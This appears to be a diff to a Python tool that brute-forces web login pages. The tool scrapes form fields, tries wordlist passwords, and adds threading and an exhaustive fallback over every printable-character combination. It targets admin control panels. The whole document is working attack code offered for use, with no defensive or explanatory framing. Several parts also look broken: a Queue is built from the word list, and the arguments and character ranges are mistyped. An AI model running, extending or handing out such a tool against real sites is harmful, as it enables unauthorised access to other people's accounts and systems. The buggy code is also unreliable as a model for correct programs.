@@ -1,11 +1,13 @@
 from urllib.request import *
-import http.cookiejar as cookielib
+from urllib.parse import *
+import http
 import threading
 import sys
-from itertools import product
+from itertools import product, chain
 from queue import Queue
 import argparse
 from html.parser import HTMLParser
+import string
 
 user_thread = 1
 wordlist = None
@@ -15,7 +17,10 @@ password_field = ""
 success_check = "Administration - Control Panel"
 target_url = ""
 target_post = ""
+running_threads = []
+num_characters = -1
 resume = None
+traditional_bruteforce = False
 
 
 
@@ -23,35 +28,59 @@ resume = None
 class Bruter(object):
     def __init__(self, username, words):
         self.username = username
-        self.password_q = words
+        self.password_q = Queue(words)
         self.found = False
 
     def run_bruteforce(self):
-
+        global user_thread
         for i in range(user_thread):
-            t = threading.Thread(target=self.web_bruter)
+            global num_characters
+            t = threading.Thread(target=self.web_bruter, args=(num_characters, i, ))
+            running_threads.append(t)
             t.start()
 
-    def web_bruter(self):
+    def web_bruter(self, num_characters, thread_num):
+
         while not self.password_q.empty() and not self.found:
             brute = self.password_q.get().rstrip()
-            jar = cookielib.FileCookieJar("cookies")
-            opener = build_opener(cookielib.HTTPCookieProcessor(jar))
+            result = self.attempt_login(brute)
+            if result == True:
+                return True
+        if traditional_bruteforce == True:
+            starting_char = (num_characters/user_thread) * thread_num
+            ending_char = (num_characters/user_thread) * (thread_num+1)
+            bruteforce_strings = self.traditional_bruteforce(starting_char, ending_char)
+            for i in bruteforce_strings:
+                result = self.attempt_login(i)
+                if result == True:
+                    return True
+            
+        return False
 
-            resposne = opener.open(target_url)
+
+
+    def traditional_bruteforce(self, start, maxlength):
+        return (''.join(candidate)
+            for candidate in chain.from_iterable(product(string.printable, repeat=i)
+            for i in range(start+1, maxlength + 1)))                 
+    def attempt_login(self, password):
+            jar = http.cookiejar.FileCookieJar("cookies")
+            opener = build_opener(HTTPCookieProcessor(jar))
+
+            response = opener.open(target_url)
 
             page = response.read()
 
             print("Trying: %s : %s  (%d left)" %
-                  (self.username, brute, self.password_q.qsize()))
+                  (self.username, password, self.password_q.qsize()))
 
-            parser.BruteParser()
+            parser = BruteParser()
             parser.feed(page)
 
             post_tags = parser.tag_results
 
             post_tags[username_field] = self.username
-            post_tags[password_field] = brute
+            post_tags[password_field] = password
 
             login_data = urlencode(post_tags)
             login_response = opener.open(target_post, login_data)
@@ -61,13 +90,11 @@ class Bruter(object):
             if success_check in login_result:
                 self.found = True
                 print("[*] Bruteforce Successful")
-                print("[*] Username %s" % username)
+                print("[*] Username %s" % self.username)
                 print("[*] Password %s" % password)
                 print("[*] Waiting for other threads to finish...")
                 return True
-        
-        for 
-
+            return False
 
 
 class BruteParser(HTMLParser):
@@ -111,8 +138,9 @@ def build_wordlist(wordlist_file):
 
 def main():
     global list_of_words
+    global username_field
     if wordlist != None:
-        list_of_words = build_wordlist()
+        list_of_words = build_wordlist(wordlist)
         
     brute = Bruter(username_field, list_of_words)
     
@@ -122,19 +150,23 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Brute-force authentication")
     parser.add_argument('target', help="Target URL to attempt brute force - contains the front-end HTML")
     parser.add_argument('target_post', help="Target POST request. This is the endpoint where login is called.")
+    parser.add_argument('num_characters', help="Maximum number of characters to brute force")
     parser.add_argument('-w', '--wordlist', help="Adds a wordlist to use for bruteforce. If none selected, it will do a traditional brute force")
     parser.add_argument('-u', '--username', help="Enters to be used. If none selected, will brute force username as well.")
     parser.add_argument('-t', '--threads', type=int, help="Sets number of threads to use. Default = 1")
+    parser.add_argument('-b', '--traditional_bruteforce', type=bool, help="Run a traditional bruteforce if password not found in wordlist. Default is false")
     args = parser.parse_args()
-    
-    if args.wordlist != None:
-        wordlist = args.wordlist
     target_url = args.target
     target_post = args.target_post
+    num_characters = args.num_characters
+    if args.wordlist != None:
+        wordlist = args.wordlist
     if args.threads != None and args.threads > 1:
-        threads = args.threads
+        user_thread = args.threads
     if args.username != None:
         username_field = args.username
+    if args.traditional_bruteforce != None:
+        traditional_bruteforce = args.traditional_bruteforce
         
     main()
         
